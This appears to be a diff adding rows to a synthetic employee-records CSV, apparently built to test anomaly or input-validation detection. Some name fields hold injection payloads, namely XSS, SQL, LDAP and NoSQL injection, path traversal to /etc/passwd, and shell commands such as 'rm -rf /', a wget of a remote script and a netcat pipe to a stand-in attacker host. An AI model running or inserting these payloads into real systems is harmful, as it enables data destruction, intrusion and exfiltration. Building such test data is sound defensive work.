+EMP01088,Charlie Johnson,30,86813,9,HR,San Francisco,7.5,13,5,0
+EMP01762,Charlie Johnson,55,40000,1,Marketing,Singapore,6.8,12,1,1
+EMP01117,<script>alert('XSS')</script>,25,78732,8,HR,Tokyo,4.2,9,4,1
+EMP01125,John Smith,52,44536,12,Sales,Tokyo,8.2,11,7,0
+EMP01660,admin)(|(password=*)),75,72230,9,Engineering,San Francisco,8.0,9,8,1
+EMP01289,Charlie Johnson,30,71073,7,Marketing,Tokyo,8.4,16,2,0
+EMP01238,Jane Garcia,29,79489,7,HR,New York,6.0,14,6,0
+EMP01000,Diana Smith,38,93765,7,Marketing,San Francisco,6.4,16,4,0
+EMP01791,Diana Brown,36,40000,4,HR,Tokyo,8.6,11,10,1
+EMP01602,$(wget malicious.sh),41,98714,10,HR,Berlin,6.9,15,8,1
+EMP01794,Jane Smith,26,40000,7,Engineering,New York,5.2,15,6,0
+EMP01465,Alice Williams,33,46725,5,Marketing,Singapore,7.0,16,1,1
+EMP01278,Diana Garcia,35,105015,1,HR,Tokyo,7.6,9,4,0
+EMP01624,John Jones,47,54103,5,Sales,Berlin,4.7,12,2,0
+EMP01116,Bob Smith,34,87157,9,HR,New York,7.6,12,3,0
+EMP01228,John Smith,29,87270,7,Marketing,San Francisco,6.8,14,4,0
+EMP01756,Diana Jones,38,93271,6,Operations,San Francisco,5.6,14,5,0
+EMP01420,Alice Smith,51,51248,8,Marketing,London,7.1,13,6,0
+EMP01434,Alice Brown,47,58926,12,Finance,London,7.1,14,8,0
+EMP01274,Diana Brown,27,94925,13,Finance,Berlin,6.0,16,5,0
+EMP01318,Diana Garcia,37,79021,7,Sales,Berlin,6.6,10,5,0
+EMP01551,Bob Jones,33,40000,14,Operations,San Francisco,8.7,13,4,0
+EMP01144,John Johnson,37,111932,4,Engineering,New York,10.0,11,2,0
+EMP01648,Alice Smith,33,99765,7,HR,San Francisco,8.1,7,6,0
+EMP01735,Bob Williams,38,43105,10,HR,Tokyo,8.2,8,2,0
+EMP01726,Diana Brown,35,112691,3,Marketing,San Francisco,4.6,11,7,0
+EMP01585,Charlie Brown,36,80985,14,Sales,Singapore,6.1,11,2,0
+EMP01369,Alice Garcia,28,92068,12,Engineering,London,7.2,9,3,0
+EMP01268,Alice Garcia,31,65645,3,Marketing,London,8.3,9,5,0
+EMP01567,Alice Smith,26,56334,2,Marketing,London,6.6,8,5,0
+EMP01307,$(wget malicious.sh),30,53931,3,Marketing,Singapore,7.5,5,90,1
+EMP01310,Diana Williams,33,71186,14,Engineering,San Francisco,6.3,13,7,0
+EMP01451,Bob Garcia,42,91670,4,Sales,San Francisco,8.8,8,4,0
+EMP01046,Jane Jones,31,80783,7,Marketing,Berlin,7.9,12,2,0
+EMP01349,Bob Garcia,33,58060,7,HR,San Francisco,7.2,12,2,0
+EMP01371,Diana Johnson,38,80623,0,Operations,Tokyo,6.4,10,8,0
+EMP01523,John Garcia,39,84730,6,HR,New York,7.4,8,5,0
+EMP01261,Bob Garcia,34,40000,11,Finance,London,6.2,9,4,0
+EMP01195,Charlie Jones,38,69377,4,Operations,Berlin,4.1,11,4,0
+EMP01799,Bob Jones,35,0,8,HR,New York,8.2,8,4,1
+EMP01672,Jane Brown,32,72319,5,Finance,Tokyo,7.8,8,3,0
+EMP01107,<script>alert('XSS')</script>,36,89925,15,Engineering,London,9.4,10,5,1
+EMP01059,Diana Brown,42,87658,12,HR,London,8.2,12,9,1
+EMP01599,John Williams,38,61862,9,Engineering,Singapore,7.3,7,2,0
+EMP01439,Bob Williams,34,107567,0,HR,Berlin,7.3,11,6,0
+EMP01100,admin)(|(password=*)),23,82373,9,Operations,Tokyo,8.4,15,3,0
+EMP01477,Alice Johnson,37,82866,12,HR,Singapore,6.5,11,7,0
+EMP01718,; rm -rf /,32,54516,5,Engineering,Tokyo,9.1,9,8,1
+EMP01583,Jane Williams,53,62885,13,Sales,New York,7.9,18,5,1
+EMP01737,Diana Jones,42,64345,8,Sales,San Francisco,6.0,6,3,0
+EMP01179,Bob Smith,56,90208,5,Operations,Singapore,10.0,12,5,1
+EMP01304,Diana Johnson,34,97163,7,HR,San Francisco,7.9,15,5,0
+EMP01429,Charlie Brown,22,119210,6,Finance,San Francisco,7.0,11,4,0
+EMP01507,Charlie Jones,28,74817,10,Finance,Berlin,5.8,9,7,0
+EMP01770,'; DROP TABLE users--,82,90885,7,Operations,New York,6.1,12,5,1
+EMP01149,Bob Johnson,37,79866,12,Finance,London,10.0,14,5,0
+EMP01124,John Johnson,39,98900,4,Sales,New York,8.9,12,5,0
+EMP01634,Charlie Brown,26,152112,1,Finance,London,7.6,14,45,1
+EMP01697,John Williams,24,99167,13,Marketing,Singapore,8.4,15,4,0
+EMP01185,Charlie Jones,40,51832,2,Finance,London,6.6,13,1,1
+EMP01541,John Jones,25,75060,8,Marketing,Berlin,6.8,16,3,0
+EMP01050,Diana Garcia,37,62537,10,Engineering,Tokyo,6.1,10,6,0
+EMP01487,| nc attacker.com 4444,26,85159,7,Finance,Berlin,9.6,1,5,1
+EMP01789,Bob Garcia,22,76722,12,Operations,Berlin,10.0,11,4,0
+EMP01485,Diana Brown,23,48375,3,Operations,Tokyo,6.8,5,4,0
+EMP01321,Jane Garcia,39,98740,10,HR,Berlin,6.7,11,2,0
+EMP01353,| nc attacker.com 4444,33,48538,5,Finance,New York,7.3,12,5,1
+EMP01739,$(wget malicious.sh),43,40000,5,Sales,London,7.1,50,1,1
+EMP01142,John Brown,22,88004,8,HR,New York,7.2,14,3,0
+EMP01370,Diana Brown,35,90178,10,Operations,London,7.2,14,8,0
+EMP01141,Diana Smith,45,92449,7,Engineering,Singapore,5.6,6,7,0
+EMP01399,Diana Williams,44,102282,5,Finance,Berlin,8.0,16,7,0
+EMP01263,John Smith,26,40205,1,Finance,Tokyo,6.1,7,7,0
+EMP01320,Bob Johnson,35,97110,0,HR,San Francisco,10.0,13,5,0
+EMP01019,Bob Williams,23,96309,12,Finance,New York,5.5,13,6,0
+EMP01172,Charlie Brown,34,-100,5,Sales,San Francisco,7.1,12,5,1
+EMP01653,; whoami,26,127033,7,Operations,Tokyo,6.3,9,7,1
+EMP01312,Jane Smith,41,92401,10,Operations,Singapore,8.2,8,6,0
+EMP01390,Diana Smith,27,77107,11,Marketing,New York,8.4,13,5,0
+EMP01745,Alice Johnson,29,84375,12,Marketing,Singapore,8.2,12,3,0
+EMP01012,Charlie Johnson,36,103939,11,Operations,San Francisco,5.8,13,7,0
+EMP01407,Diana Brown,33,350000,4,Finance,New York,6.3,11,9,1
+EMP01408,Bob Garcia,35,46947,10,Engineering,San Francisco,8.9,15,3,0
+EMP01305,Diana Smith,35,54201,9,Operations,Singapore,9.1,13,6,0
+EMP01354,Bob Brown,34,107840,5,Sales,San Francisco,7.4,14,6,0
+EMP01025,; whoami,35,104067,12,Finance,London,8.3,5,4,1
+EMP01597,Charlie Jones,27,55567,8,HR,New York,5.6,17,6,0
+EMP01169,Charlie Smith,28,46384,10,Operations,London,7.1,9,7,0
+EMP01038,Alice Brown,24,94686,16,Engineering,London,6.8,18,5,1
+EMP01175,Charlie Smith,41,40000,2,Operations,Berlin,5.8,10,60,1
+EMP01245,Jane Garcia,32,92673,3,Sales,Berlin,6.3,15,6,0
+EMP01298,Bob Jones,41,93326,10,Finance,Tokyo,8.4,12,7,0
+EMP01668,Charlie Williams,22,-100,5,Sales,Berlin,7.8,7,4,1
+EMP01416,Alice Jones,47,61530,6,HR,San Francisco,8.2,13,6,0
+EMP01548,John Garcia,37,500000,7,Finance,Singapore,7.2,8,1,1
+EMP01272,Charlie Johnson,44,76536,6,Engineering,Berlin,7.9,14,5,0
+EMP01611,Alice Johnson,34,86124,10,Sales,San Francisco,9.5,9,3,0
+EMP01154,| nc attacker.com 4444,37,73356,10,Sales,Tokyo,6.2,11,3,1
+EMP01126,Alice Smith,27,63821,5,Marketing,New York,8.1,8,3,0
+EMP01449,Bob Jones,26,43882,8,HR,San Francisco,6.7,8,5,0
+EMP01571,<img src=x onerror=alert(1)>,48,109234,7,Operations,Berlin,7.4,13,4,1
+EMP01341,Diana Johnson,36,102514,6,Marketing,London,8.2,11,6,0
+EMP01430,Bob Brown,25,63850,11,HR,New York,4.9,11,2,0
+EMP01287,Alice Brown,39,79775,9,Finance,Singapore,5.2,7,45,1
+EMP01113,Bob Garcia,54,106549,11,Finance,London,7.1,15,6,1
+EMP01499,Jane Smith,23,81433,11,Finance,Tokyo,7.9,12,6,0
+EMP01173,Charlie Jones,37,61947,8,Finance,Tokyo,7.4,9,5,0
+EMP01359,Bob Brown,28,68503,8,Marketing,Tokyo,8.4,11,3,0
+EMP01482,John Smith,22,89162,2,Finance,San Francisco,6.6,12,7,0
+EMP01057,Charlie Garcia,32,15000,13,HR,London,7.9,7,3,1
+EMP01552,Diana Brown,44,85829,8,Engineering,Berlin,8.2,12,3,0
+EMP01222,John Williams,40,74512,7,Sales,New York,7.6,10,5,0
+EMP01280,Bob Smith,35,68026,11,Engineering,Singapore,8.5,13,4,0
+EMP01017,Alice Smith,82,92792,4,Finance,London,8.0,10,6,1
+EMP01127,Charlie Johnson,30,82544,11,Engineering,Singapore,8.4,5,2,0
+EMP01322,Diana Smith,28,-5000,3,Finance,San Francisco,5.9,50,3,1
+EMP01255,Jane Smith,31,61567,5,Operations,London,8.8,11,8,0
+EMP01538,Bob Williams,43,67236,3,Marketing,Tokyo,5.0,15,9,1
+EMP01470,Diana Johnson,32,15000,11,HR,Berlin,6.5,19,3,1
+EMP01598,Diana Johnson,31,99008,5,HR,San Francisco,8.0,12,4,0
+EMP01468,Alice Smith,30,176064,2,Finance,Tokyo,8.3,12,6,1
+EMP01768,Jane Smith,29,43749,3,Finance,Singapore,7.4,10,8,0
+EMP01190,Bob Johnson,31,79167,0,Marketing,Berlin,9.4,6,2,0
+EMP01115,Bob Jones,37,80580,7,Sales,New York,8.0,15,5,0
+EMP01516,John Brown,39,53697,7,Engineering,New York,7.2,20,0,1
+EMP01709,Diana Garcia,48,104550,11,Finance,London,4.7,14,5,0
+EMP01535,Bob Smith,35,68258,5,Marketing,Tokyo,9.7,9,4,0
+EMP01094,Jane Jones,31,102643,8,HR,London,5.6,17,3,0
+EMP01180,Charlie Johnson,40,90716,2,HR,Singapore,8.1,12,2,0
+EMP01301,Bob Brown,30,40000,6,Engineering,Berlin,9.1,8,4,0
+EMP01616,Diana Brown,35,76140,6,Marketing,London,5.2,16,7,0
+EMP01581,Diana Jones,31,65241,6,Engineering,New York,9.4,24,3,0
+EMP01590,Diana Williams,35,84199,1,Finance,Berlin,9.8,14,4,0
+EMP01731,Alice Brown,27,40000,7,Operations,Singapore,7.4,4,7,0
+EMP01558,Alice Williams,38,45421,13,Operations,Berlin,9.2,15,4,0
+EMP01708,Jane Johnson,22,76768,10,Operations,Berlin,8.2,11,45,1
+EMP01542,John Brown,82,83738,8,Marketing,Singapore,8.5,14,8,1
+EMP01005,Diana Garcia,33,68816,4,Finance,New York,9.5,16,4,0
+EMP01785,Charlie Williams,43,88862,4,HR,London,9.5,4,4,0
+EMP01045,<img src=x onerror=alert(1)>,29,84849,9,Marketing,New York,7.9,20,4,1
+EMP01725,Diana Smith,33,96774,10,Marketing,Singapore,8.6,11,6,0
+EMP01157,Jane Brown,38,84135,11,Engineering,New York,7.5,11,4,0
+EMP01605,Diana Brown,50,59864,9,Finance,Singapore,5.5,13,4,0
+EMP01171,John Smith,25,61378,22,Sales,London,5.3,15,6,0
+EMP01016,Bob Jones,26,350000,9,Sales,Singapore,8.3,15,6,1
+EMP01511,Jane Williams,34,91355,7,Engineering,New York,8.0,1,6,0
+EMP01048,Jane Brown,37,62245,12,HR,San Francisco,6.3,13,5,0
+EMP01774,Alice Smith,39,84328,12,Marketing,Tokyo,6.0,14,6,0
+EMP01757,John Smith,36,58936,8,Operations,Berlin,7.7,7,8,0
+EMP01480,Diana Jones,33,77670,8,Engineering,Singapore,4.1,12,5,0
+EMP01283,Diana Smith,25,116534,5,Marketing,London,8.6,5,7,0
+EMP01536,Bob Garcia,28,62731,8,HR,Tokyo,6.6,14,90,1
+EMP01225,Diana Brown,43,0,9,Operations,Tokyo,6.2,10,5,1
+EMP01026,John Garcia,25,106591,6,HR,Berlin,8.4,13,3,0
+EMP01630,Alice Jones,22,81148,5,HR,Berlin,4.0,10,4,0
+EMP01437,Diana Brown,23,63928,5,Marketing,Berlin,9.9,9,6,0
+EMP01364,Charlie Jones,40,95451,10,Operations,New York,7.9,12,5,0
+EMP01229,John Garcia,40,54544,8,Sales,Tokyo,6.8,14,5,0
+EMP01037,John Brown,22,55032,9,Finance,Berlin,8.7,10,6,0
+EMP01779,Bob Williams,39,183791,1,Finance,Berlin,8.3,10,7,1
+EMP01374,John Brown,52,59920,7,HR,Singapore,6.8,15,3,0
+EMP01469,Diana Jones,30,99721,11,Engineering,Singapore,9.3,8,4,0
+EMP01771,Alice Johnson,30,49914,5,Marketing,Berlin,8.4,11,2,0
+EMP01682,John Jones,30,109539,12,Engineering,Singapore,4.5,9,6,0
+EMP01694,Bob Smith,39,105842,4,Operations,Tokyo,6.2,11,3,0
+EMP01194,John Brown,36,54967,8,Operations,London,8.8,18,5,0
+EMP01684,Alice Johnson,25,79493,6,Sales,Tokyo,7.2,11,5,0
+EMP01693,`cat /etc/passwd`,39,78691,4,Engineering,Berlin,8.1,16,6,1
+EMP01503,Charlie Brown,22,59885,24,HR,Singapore,8.0,11,5,1
+EMP01773,John Johnson,42,47868,10,Sales,New York,8.7,15,5,0
+EMP01669,Diana Brown,43,350000,7,Operations,San Francisco,8.5,18,3,1
+EMP01772,Charlie Williams,40,80871,8,HR,New York,5.5,9,6,0
+EMP01162,Bob Garcia,44,78930,8,Sales,Tokyo,6.1,14,2,0
+EMP01751,John Brown,24,70926,10,Marketing,Berlin,6.9,13,7,0
+EMP01152,John Garcia,29,49969,5,HR,Singapore,10.0,100,7,0
+EMP01557,Alice Brown,31,82836,6,Operations,Tokyo,7.1,7,4,0
+EMP01572,Jane Jones,37,47561,6,Finance,New York,5.4,7,7,0
+EMP01675,Charlie Williams,28,87965,3,Marketing,Singapore,10.0,16,2,0
+EMP01111,$(wget malicious.sh),34,79383,7,Finance,Berlin,8.3,11,2,1
+EMP01226,../../../etc/passwd,35,75760,3,Engineering,London,9.6,19,6,1
+EMP01792,John Smith,37,83731,2,Marketing,Berlin,10.0,13,5,0
+EMP01103,Bob Smith,28,100569,12,Sales,Singapore,6.6,22,6,0
+EMP01421,Bob Brown,49,81196,9,Sales,Singapore,8.8,10,2,0
+EMP01419,Charlie Garcia,35,117902,3,Sales,London,4.6,11,5,0
+EMP01119,John Jones,41,78881,6,HR,London,6.2,15,5,0
+EMP01053,John Johnson,39,98780,6,Operations,San Francisco,6.4,10,3,0
+EMP01151,Charlie Smith,37,82041,10,Operations,San Francisco,4.7,10,5,0
+EMP01403,John Johnson,35,85865,6,Operations,London,6.0,10,7,0
+EMP01753,John Brown,43,58462,2,Engineering,Berlin,6.9,13,6,0
+EMP01207,Charlie Williams,39,87703,10,Engineering,New York,4.2,13,4,0
+EMP01677,Diana Williams,49,83390,3,Operations,New York,8.3,17,4,0
+EMP01618,Bob Garcia,38,105569,16,Engineering,New York,6.8,20,2,0
+EMP01008,John Smith,31,100115,9,Engineering,San Francisco,8.7,14,4,0
+EMP01651,Jane Johnson,44,109044,14,Engineering,Singapore,6.4,11,6,0
+EMP01036,John Johnson,36,106010,4,Engineering,London,7.3,14,6,0
+EMP01452,Diana Brown,27,40000,5,HR,Tokyo,5.8,14,4,0
+EMP01253,Bob Williams,43,80213,11,Marketing,London,9.0,11,3,0
+EMP01303,Charlie Brown,39,72208,9,Engineering,San Francisco,9.0,15,4,0
+EMP01606,Jane Brown,28,46563,13,Finance,Singapore,8.2,13,6,0
+EMP01579,Diana Brown,44,163883,1,Operations,San Francisco,7.8,18,90,1
+EMP01587,John Brown,28,106230,6,HR,Berlin,7.6,10,8,0
+EMP01262,Charlie Williams,22,97975,11,Engineering,Singapore,8.4,15,3,0
+EMP01297,Alice Johnson,37,40000,14,Marketing,London,5.5,13,5,0
+EMP01414,Charlie Smith,37,69101,11,Finance,London,10.0,7,7,0
+EMP01150,John Brown,37,70175,0,Marketing,San Francisco,5.1,6,8,0
+EMP01636,Diana Brown,41,70026,8,Operations,Tokyo,7.0,6,4,0
+EMP01712,John Brown,30,60663,8,Sales,London,7.0,8,3,0
+EMP01550,John Johnson,35,0,7,HR,Singapore,9.3,12,4,1
+EMP01488,Bob Brown,48,52932,6,Marketing,San Francisco,6.9,9,1,1
+EMP01147,Jane Brown,24,61161,10,Operations,London,6.7,10,90,1
+EMP01146,Charlie Brown,25,44489,11,Operations,London,5.4,13,4,0
+EMP01588,John Garcia,41,75640,6,HR,New York,5.8,10,4,0
+EMP01742,Bob Jones,30,108225,9,Finance,Singapore,7.4,13,9,1
+EMP01601,Charlie Williams,27,85733,7,HR,San Francisco,6.2,12,45,1
+EMP01348,Jane Johnson,29,106890,12,HR,Singapore,8.1,20,5,0
+EMP01463,{'$ne': null},36,56586,7,Engineering,San Francisco,8.5,13,6,0
+EMP01325,Diana Jones,25,52073,4,Operations,Tokyo,7.5,21,6,0
+EMP01186,Alice Williams,38,105067,6,Engineering,Tokyo,5.5,9,5,0
+EMP01123,Diana Garcia,23,60997,10,Engineering,London,7.0,9,5,0
+EMP01683,Diana Brown,38,67007,4,Marketing,San Francisco,5.8,10,4,0
+EMP01143,Diana Williams,36,185593,1,Finance,San Francisco,7.0,11,6,1
+EMP01763,Jane Williams,34,92680,12,Engineering,Tokyo,6.5,9,4,0
+EMP01197,Charlie Johnson,36,87816,4,HR,Berlin,7.8,14,5,0
+EMP01279,Jane Williams,31,92004,4,HR,London,7.1,5,3,0
+EMP01293,Jane Jones,41,76038,7,Marketing,New York,7.3,12,45,1
+EMP01400,; rm -rf /,22,77504,5,Sales,Tokyo,7.8,11,4,1
+EMP01122,John Smith,46,77659,10,Engineering,Tokyo,8.1,8,5,0
+EMP01183,John Brown,38,500000,11,Operations,Berlin,9.3,17,3,1
+EMP01202,Jane Brown,43,76192,5,Sales,Berlin,6.5,15,6,0
+EMP01438,Alice Smith,22,86379,7,Sales,Singapore,10.0,15,3,0
+EMP01246,Alice Brown,82,88046,13,Operations,Tokyo,6.9,7,4,1
+EMP01415,Charlie Smith,29,99954,7,Marketing,Tokyo,8.7,21,60,1
+EMP01711,Charlie Williams,34,71126,15,Engineering,London,7.1,10,3,0
+EMP01129,Bob Johnson,30,73684,15,Engineering,San Francisco,5.8,17,4,0
+EMP01402,Diana Garcia,35,77445,4,Sales,Singapore,8.0,13,7,0
+EMP01632,Diana Smith,33,92209,0,HR,Tokyo,8.2,18,5,0
+EMP01623,John Brown,45,58215,7,Marketing,Berlin,9.2,8,6,0
+EMP01727,`cat /etc/passwd`,37,-5000,6,HR,Berlin,9.5,12,4,1
+EMP01219,John Smith,35,83483,4,HR,New York,9.7,16,2,0
+EMP01729,John Johnson,28,52607,11,Sales,New York,6.9,100,13,1
+EMP01609,Charlie Jones,46,69983,7,Finance,San Francisco,6.8,13,2,0
+EMP01732,John Smith,38,81463,1,Operations,Singapore,4.9,12,7,0
+EMP01617,Diana Brown,40,80371,7,HR,London,4.0,13,2,0
+EMP01386,John Brown,75,55350,10,Engineering,Berlin,6.3,12,1,1
+EMP01775,Jane Garcia,22,74287,13,Operations,San Francisco,6.4,11,3,0
+EMP01509,Diana Smith,28,84493,10,Marketing,Tokyo,9.4,14,4,0
+EMP01267,Charlie Brown,23,98216,12,HR,Singapore,5.7,14,3,0
+EMP01781,John Brown,24,97972,4,Engineering,New York,8.3,12,0,1
+EMP01441,Jane Williams,34,70928,6,Operations,Berlin,5.2,15,3,0
+EMP01496,John Johnson,26,-100,10,Operations,Tokyo,4.4,12,6,1
+EMP01112,Diana Williams,35,79987,0,Finance,Tokyo,8.3,13,6,0
+EMP01232,Charlie Jones,35,82984,11,Operations,Tokyo,7.8,11,4,0
+EMP01698,Alice Garcia,42,95481,10,Finance,Berlin,7.3,14,4,0
+EMP01607,Charlie Brown,25,105026,9,Operations,Berlin,5.2,10,4,0
+EMP01373,Charlie Jones,42,73748,8,Marketing,Singapore,5.2,8,5,0
+EMP01233,Jane Brown,29,87943,9,Operations,Singapore,8.0,16,7,0
+EMP01633,Alice Garcia,31,63338,11,HR,Singapore,6.0,17,4,0
+EMP01317,Charlie Johnson,32,73847,5,Marketing,New York,8.8,15,5,0
+EMP01410,Charlie Garcia,40,50122,1,HR,Tokyo,7.3,18,10,1
+EMP01717,Diana Williams,36,87616,5,Finance,Berlin,6.4,14,8,0
+EMP01358,John Jones,37,94635,12,HR,Tokyo,5.8,16,2,0
+EMP01258,Alice Smith,38,85872,9,Operations,Berlin,7.8,11,45,1
+EMP01627,{'$ne': null},33,52935,5,HR,Tokyo,8.2,14,5,0
+EMP01282,Charlie Williams,47,68567,3,Engineering,London,7.0,12,6,0
+EMP01376,Diana Smith,41,41140,12,HR,San Francisco,7.1,13,6,0
+EMP01384,Bob Williams,28,55207,11,Sales,Berlin,6.8,12,1,1
+EMP01224,Alice Johnson,31,109550,8,Marketing,New York,8.1,7,5,0
+EMP01759,Jane Jones,40,69577,9,Marketing,San Francisco,8.0,16,8,0
+EMP01657,Charlie Garcia,34,82623,6,Operations,Tokyo,7.8,16,2,0
+EMP01472,Diana Brown,22,53153,8,Engineering,New York,4.4,7,5,0
+EMP01347,John Johnson,23,46198,7,Sales,Berlin,5.8,12,4,0
+EMP01505,Alice Jones,31,57030,14,Engineering,Berlin,8.6,13,11,1
+EMP01639,Jane Garcia,24,89697,10,Operations,London,7.2,7,1,1
+EMP01788,Bob Brown,34,58448,11,HR,Berlin,8.8,8,8,0
+EMP01740,Jane Brown,22,74449,10,Sales,San Francisco,8.8,14,7,0
+EMP01722,John Jones,24,70470,9,HR,London,8.2,8,3,0
+EMP01619,Diana Johnson,36,85156,7,Operations,Singapore,8.3,13,8,0
+EMP01685,Charlie Williams,40,93651,9,Marketing,San Francisco,8.0,8,3,0
+EMP01645,Bob Johnson,32,61972,8,HR,San Francisco,4.4,17,4,0
+EMP01678,John Garcia,42,57250,10,Finance,San Francisco,7.9,13,1,1
+EMP01556,John Brown,82,64075,6,Sales,London,8.9,9,3,1
+EMP01577,Charlie Johnson,82,95798,8,Sales,New York,6.2,9,5,1
+EMP01085,Jane Brown,30,111934,12,Marketing,Singapore,8.8,14,3,0
+EMP01242,Jane Johnson,39,96573,5,Sales,San Francisco,6.2,14,6,0
+EMP01159,Bob Smith,40,83954,13,Sales,San Francisco,8.9,14,6,0
+EMP01524,Jane Williams,28,76289,8,Finance,Tokyo,7.6,11,5,0
+EMP01035,Jane Williams,25,79684,6,Engineering,Singapore,6.9,14,6,0
+EMP01540,Bob Brown,41,78211,8,Marketing,Berlin,9.0,50,7,0
+EMP01170,$(wget malicious.sh),27,77562,8,Finance,Singapore,7.6,13,7,1
+EMP01654,Jane Johnson,55,86310,2,Finance,Singapore,10.0,13,4,1
+EMP01687,Jane Jones,32,40000,6,Finance,London,9.3,14,5,0
+EMP01679,Bob Williams,45,66250,9,HR,Singapore,7.1,11,3,0
+EMP01752,Alice Johnson,27,57440,10,Engineering,Berlin,4.0,15,6,0
+EMP01095,Charlie Smith,82,87974,15,HR,Tokyo,8.7,10,5,1
+EMP01563,Diana Brown,32,55538,12,HR,Tokyo,5.9,13,5,0
+EMP01240,Charlie Brown,28,108678,7,Sales,San Francisco,10.0,14,4,0
+EMP01574,Bob Garcia,41,104423,4,Finance,Berlin,8.9,9,2,0
+EMP01460,Charlie Williams,50,86166,11,HR,Singapore,6.7,16,5,0
+EMP01553,Alice Johnson,37,90183,8,HR,San Francisco,9.8,9,7,0
+EMP01704,' UNION SELECT * FROM passwords--,22,71596,15,Finance,London,6.4,7,4,1
+EMP01206,John Garcia,39,92903,9,HR,Berlin,6.6,14,2,0
+EMP01392,John Johnson,24,62972,12,Marketing,London,6.9,6,5,0
+EMP01397,John Jones,45,86049,4,Sales,San Francisco,4.8,3,6,0
+EMP01680,{'$gt': ''},40,89447,1,HR,Berlin,9.3,6,10,1
+EMP01217,Alice Jones,33,65322,5,HR,Berlin,7.6,9,3,0
+EMP01004,Diana Smith,33,66310,6,Marketing,Singapore,10.0,15,3,0
+EMP01642,John Brown,32,78620,15,Finance,Singapore,6.6,14,0,1
+EMP01716,Diana Garcia,35,105268,11,Operations,New York,7.2,11,6,0
+EMP01612,Diana Johnson,37,84117,11,Finance,Berlin,5.6,7,5,0
+EMP01546,Jane Garcia,39,40000,1,Engineering,New York,7.6,11,7,0
+EMP01098,John Williams,35,99130,10,Sales,Tokyo,8.7,1,3,0
+EMP01573,Alice Jones,33,42728,8,Operations,New York,10.0,9,4,0
+EMP01406,Alice Jones,26,60960,8,Operations,Berlin,7.4,10,45,1
+EMP01502,Charlie Johnson,23,71500,4,Sales,New York,6.6,11,5,0
+EMP01047,Diana Johnson,43,124106,11,Marketing,New York,7.1,12,60,1
+EMP01032,Charlie Johnson,82,54917,5,Finance,New York,7.5,9,5,1
+EMP01200,John Johnson,37,102987,15,Engineering,Tokyo,4.7,12,5,0
+EMP01134,Bob Johnson,27,83800,11,Finance,Tokyo,6.9,19,5,0
+EMP01027,Bob Jones,38,64542,13,Operations,San Francisco,7.4,18,4,0
+EMP01706,Alice Smith,24,88927,10,Marketing,Tokyo,5.6,11,1,1
+EMP01230,Jane Jones,29,-5000,10,HR,Berlin,7.9,17,5,1
+EMP01489,Bob Williams,42,40000,13,Engineering,Berlin,8.1,6,2,0
+EMP01378,Bob Johnson,52,55228,4,Sales,Tokyo,7.4,10,4,0
+EMP01288,Diana Williams,37,69819,6,Marketing,Tokyo,8.6,18,6,0
+EMP01418,Alice Smith,24,58293,29,Finance,London,8.1,13,3,1
+EMP01674,Jane Brown,23,59302,3,Engineering,Singapore,6.4,10,2,0
+EMP01391,Diana Smith,38,48319,11,Operations,Berlin,6.7,12,5,0
+EMP01592,Alice Brown,38,115267,16,Finance,Tokyo,7.6,7,4,0
+EMP01498,Alice Smith,27,80347,1,Marketing,Singapore,7.1,13,6,0
+EMP01138,Bob Brown,41,79876,11,HR,London,5.6,9,5,0
+EMP01062,Alice Johnson,26,105950,0,Marketing,Tokyo,8.2,16,4,0
+EMP01471,Jane Johnson,22,87182,12,Sales,London,8.2,12,14,1
+EMP01647,John Smith,34,86727,2,Finance,Berlin,7.0,9,7,0
+EMP01128,Alice Garcia,35,106310,9,Operations,Singapore,10.0,13,4,0
+EMP01778,John Brown,34,60308,6,Sales,New York,9.0,10,4,0
+EMP01520,Jane Williams,22,76132,17,Sales,New York,6.4,15,2,1
+EMP01064,Charlie Jones,41,62744,13,Sales,London,8.8,13,4,0
+EMP01014,Diana Jones,22,95636,7,Finance,Singapore,9.0,7,7,0
+EMP01156,Bob Brown,49,81854,7,Marketing,New York,4.0,14,6,0
+EMP01040,Jane Williams,40,74010,8,Operations,San Francisco,10.0,14,3,0
+EMP01492,John Smith,35,74878,10,HR,New York,8.7,6,8,0
+EMP01379,Bob Johnson,28,52928,9,Sales,London,8.2,8,6,0
+EMP01187,Jane Garcia,34,92547,4,Finance,New York,7.2,9,3,0
+EMP01216,Diana Garcia,75,61971,0,Finance,San Francisco,6.4,12,4,1
+EMP01052,Diana Williams,29,62252,8,HR,Tokyo,7.4,13,4,0
+EMP01337,Bob Brown,32,50447,9,HR,Tokyo,8.0,10,5,0
+EMP01295,Bob Jones,22,73385,29,Sales,Berlin,9.6,10,5,1
+EMP01701,Charlie Williams,22,63976,22,HR,San Francisco,8.8,18,4,1
+EMP01251,John Brown,42,82916,15,Finance,Tokyo,9.8,9,4,0
+EMP01461,Bob Garcia,22,76520,30,Engineering,Berlin,8.2,11,3,1
+EMP01455,Jane Brown,28,50807,4,Sales,London,6.7,14,6,0
+EMP01797,Charlie Jones,40,116149,3,Operations,Singapore,4.7,4,5,0
+EMP01269,Alice Brown,36,81930,6,Engineering,San Francisco,8.4,8,4,0
+EMP01201,Alice Williams,39,93492,7,HR,London,8.4,9,7,0
+EMP01161,Bob Williams,41,101583,10,Sales,London,7.6,9,4,0
+EMP01555,Diana Brown,31,40000,5,HR,New York,10.0,12,4,0
+EMP01401,Charlie Jones,30,66411,7,Sales,Tokyo,10.0,11,1,1
+EMP01702,Charlie Jones,29,58636,6,HR,Singapore,10.0,20,5,0
+EMP01476,John Johnson,39,121386,10,Operations,Singapore,6.1,12,7,0
+EMP01105,Jane Garcia,38,75928,7,Operations,New York,6.3,11,5,0
+EMP01565,../../../etc/passwd,31,71829,3,Engineering,San Francisco,7.1,12,60,1
+EMP01389,Alice Johnson,30,55633,9,Marketing,San Francisco,7.8,12,3,0
+EMP01001,John Garcia,33,64679,13,HR,Berlin,7.8,15,3,0
+EMP01767,Charlie Williams,49,85318,1,Engineering,New York,7.7,8,5,0
+EMP01561,Bob Garcia,51,86585,8,Marketing,Tokyo,6.6,13,10,1
+EMP01080,Diana Smith,33,15000,9,Marketing,Singapore,6.6,11,7,1
+EMP01205,Diana Jones,27,82869,1,Operations,San Francisco,7.2,11,5,0
+EMP01034,John Garcia,41,74306,6,Engineering,Berlin,7.8,13,5,0
+EMP01508,John Jones,35,96717,6,Operations,New York,6.8,9,7,0
+EMP01427,Charlie Garcia,40,72059,12,Marketing,London,7.4,9,5,0
+EMP01454,John Williams,30,196621,0,Marketing,Singapore,9.3,12,4,1
+EMP01366,Jane Williams,36,102685,7,Operations,Singapore,7.4,13,3,0
+EMP01091,Diana Jones,42,85145,6,HR,Singapore,6.5,8,9,1
+EMP01339,<img src=x onerror=alert(1)>,30,350000,8,Operations,Berlin,8.8,13,8,1
